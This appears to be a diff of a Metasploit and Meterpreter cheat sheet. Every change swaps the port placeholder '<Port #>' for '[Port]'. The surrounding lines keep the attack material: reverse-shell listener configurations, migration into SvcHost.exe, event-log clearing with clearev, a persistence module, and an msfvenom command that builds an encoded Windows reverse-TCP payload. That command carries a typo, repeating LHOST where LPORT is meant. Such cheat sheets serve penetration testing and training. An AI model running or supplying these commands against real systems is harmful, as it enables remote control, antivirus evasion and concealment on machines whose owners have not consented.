@@ -164,7 +164,7 @@ upload <Source> <Destination>
 use exploit/multi/handler
 set AutoRunScript migrate -n SvcHost.exe
 set LHOST <Attack Host>
-set LPORT <Port #>
+set LPORT [Port]
 run -j
 ```
 ##### Execute Shell Commands on Target
@@ -348,7 +348,7 @@ meterpreter > clearev
 ```bash
 use exploit/multi/handler
 set LHOST <Attack Host>
-set LPORT <Port #>
+set LPORT [Port]
 set PAYLOAD <Payload specified in msfvenom>
 run -j
 ```
@@ -356,7 +356,7 @@ run -j
 ```bash
 use exploit/multi/handler
 set LHOST <Attack Host>
-set LPORT <Port #>
+set LPORT [Port]
 set HandlerSSLCert <Path to PEM generated>
 set StagerVerifySSLCert true
 set PAYLOAD <Payload specified in msfvenom>
@@ -591,7 +591,7 @@ $ msfvenom -p linux/x86/meterpreter/reverse_tcp --list-options
 
 ##### Windows Meterpreter Reverse Shell with Encoding
 ```bash
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Attack Machine> LHOST=<Port #> -f exe -e x86/shikata_ga_nai -o <Outpuf File>
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Attack Machine> LHOST=[Port] -f exe -e x86/shikata_ga_nai -o <Outpuf File>
 ```
 ##### Windows Meterpreter HTTPS Reverse Shell
 ```bash
@@ -944,7 +944,7 @@ set SESSION [Session ID]
 set STARTUP <Startup Type>
 set PAYLOAD windows/meterpreter/reverse_tcp
 set LHOST <Attack Host>
-set LPORT <Port #>
+set LPORT [Port]
 exploit
 ```
 
